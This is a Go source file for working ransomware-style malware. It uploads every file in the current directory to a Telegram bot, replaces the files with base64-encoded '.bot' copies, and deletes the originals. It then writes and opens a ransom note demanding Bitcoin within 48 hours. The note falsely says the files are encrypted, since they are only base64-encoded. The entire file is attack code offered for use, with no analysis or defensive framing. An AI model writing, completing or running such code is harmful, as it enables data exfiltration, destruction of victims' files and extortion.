package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"encoding/base64"
	"strings"
	"strconv"

	"github.com/go-telegram-bot-api/telegram-bot-api"
)

// Telegram Bot Token
const botToken = "TELEGRAMBOTTOKEN"

// Telegram Chat ID (replace with your numeric chat ID)
const chatID = "CHATID" // This is your chat ID as a string

func encodeFile(filePath string) (string, string, error) {
	// Read file content
	data, err := ioutil.ReadFile(filePath)
	if err != nil {
		return "", "", err
	}

	// Encode file content to base64
	encoded := base64.StdEncoding.EncodeToString(data)

	// Get the original file extension
	ext := filepath.Ext(filePath)

	// Include the extension at the beginning of the .bot file (separated by newline)
	encodedData := ext + "\n" + encoded

	// Change file extension to .bot
	newFileName := strings.TrimSuffix(filepath.Base(filePath), ext) + ".bot"

	return encodedData, newFileName, nil
}

// Upload file to Telegram bot (only the original file, not the encoded .bot file)
func uploadFileToTelegram(filePath string) error {
	// Create bot instance
	bot, err := tgbotapi.NewBotAPI(botToken)
	if err != nil {
		return fmt.Errorf("error creating bot: %v", err)
	}

	// Convert chatID string to int64
	chatIDInt64, err := strconv.ParseInt(chatID, 10, 64)
	if err != nil {
		return fmt.Errorf("error converting chatID to int64: %v", err)
	}

	// Send the original file to Telegram
	fileToSend := tgbotapi.NewDocumentUpload(chatIDInt64, filePath)
	_, err = bot.Send(fileToSend)
	if err != nil {
		return fmt.Errorf("error sending file to Telegram: %v", err)
	}

	return nil
}

// Delete all files except .bot files
func deleteNonBotFiles(dir string) error {
	files, err := ioutil.ReadDir(dir)
	if err != nil {
		return fmt.Errorf("error reading directory: %v", err)
	}

	for _, file := range files {
		if !file.IsDir() && filepath.Ext(file.Name()) != ".bot" {
			filePath := filepath.Join(dir, file.Name())
			err := os.Remove(filePath)
			if err != nil {
				log.Printf("Failed to delete %s: %v", file.Name(), err)
			} else {
				log.Printf("Deleted %s", file.Name())
			}
		}
	}
	return nil
}



// Create a ransom note README file and open it in Notepad on Windows
func createRansomNoteAndOpen(dir string) error {
	notePath := filepath.Join(dir, "README.txt")
	noteContent := `Greetings,

Your files have been encrypted, and all sensitive information is now under our control. To regain access, you will need to meet our demands.

Instructions:

Payment must be made in Bitcoin to the following address: 1FfmbHfnpaZjKFvyi1okTjJJusN455paPH
You have 48 hours to make the payment. Failure to do so will result in permanent data loss.
Once payment is received, we will send a decryption key.

Do not attempt to bypass or remove the encryption, as this will result in permanent loss of your data.
	`

	// Write ransom note content to README.txt
	err := ioutil.WriteFile(notePath, []byte(noteContent), 0644)
	if err != nil {
		return fmt.Errorf("error writing ransom note: %v", err)
	}

	log.Println("Ransom note created: README.txt")

	// Open the README file with Notepad on Windows
	err = exec.Command("notepad", notePath).Start()
	if err != nil {
		log.Printf("Error opening ransom note: %v", err)
	}
	return nil
}

func main() {
	// Get the current directory
	dir, err := os.Getwd()
	if err != nil {
		log.Fatalf("Failed to get current directory: %v", err)
	}

	// List all files in the current directory
	files, err := ioutil.ReadDir(dir)
	if err != nil {
		log.Fatalf("Failed to read directory: %v", err)
	}

	// Define extensions to exclude from uploading and encoding
	excludeExtensions := map[string]bool{
		".exe": true,
		".bot": true,
		".go":  true,
	}

	// First, send all files in their original formats (excluding .bot and the excluded extensions)
	for _, file := range files {
		if !file.IsDir() && !excludeExtensions[filepath.Ext(file.Name())] {
			filePath := filepath.Join(dir, file.Name())

			// Upload the original file
			err := uploadFileToTelegram(filePath)
			if err != nil {
				log.Printf("Error processing original file %s: %v", file.Name(), err)
			} else {
				log.Printf("Successfully uploaded original file %s", file.Name())
			}
		}
	}

	// Then, encode files and change extension to .bot (only for non-excluded extensions)
	for _, file := range files {
		if !file.IsDir() && !excludeExtensions[filepath.Ext(file.Name())] {
			filePath := filepath.Join(dir, file.Name())

			// Encode the file and get the new file name
			encoded, newFileName, err := encodeFile(filePath)
			if err != nil {
				log.Printf("Error encoding file %s: %v", file.Name(), err)
				continue
			}

			// Create a .bot file with the base64 encoded content
			encodedFilePath := filepath.Join(dir, newFileName)
			err = ioutil.WriteFile(encodedFilePath, []byte(encoded), 0644)
			if err != nil {
				log.Printf("Error writing encoded .bot file %s: %v", newFileName, err)
				continue
			}

			// Log that the .bot file was created but not uploaded
			log.Printf("Created .bot file %s, but not uploading to Telegram", newFileName)
		}
	}

	// Delete all files except .bot files
	err = deleteNonBotFiles(dir)
	if err != nil {
		log.Printf("Error deleting non-.bot files: %v", err)
	} else {
		log.Println("Successfully deleted all non-.bot files.")
	}

	// Create and open the ransom note README file
	err = createRansomNoteAndOpen(dir)
	if err != nil {
		log.Printf("Error creating ransom note: %v", err)
	} else {
		log.Println("Ransom note created and opened successfully.")
	}
}
